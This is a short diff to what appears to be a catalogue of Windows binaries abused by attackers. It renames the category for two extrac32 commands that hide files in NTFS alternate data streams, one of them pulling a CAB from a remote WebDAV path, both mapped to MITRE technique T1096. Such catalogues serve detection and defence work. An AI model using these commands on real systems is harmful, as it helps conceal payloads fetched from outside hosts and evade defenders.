@@ -7,7 +7,7 @@ Commands:
   - Command: extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
     Description: Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.
     Usecase: Extract data from cab file and hide it in an alternate data stream. 
-    Category: Alternate data streams
+    Category: ADS
     Privileges: User
     MitreID: T1096
     MitreLink: https://attack.mitre.org/wiki/Technique/T1096
@@ -15,7 +15,7 @@ Commands:
   - Command: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe
     Description: Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.
     Usecase: Extract data from cab file and hide it in an alternate data stream. 
-    Category: Alternate data streams
+    Category: ADS
     Privileges: User
     MitreID: T1096
     MitreLink: https://attack.mitre.org/wiki/Technique/T1096
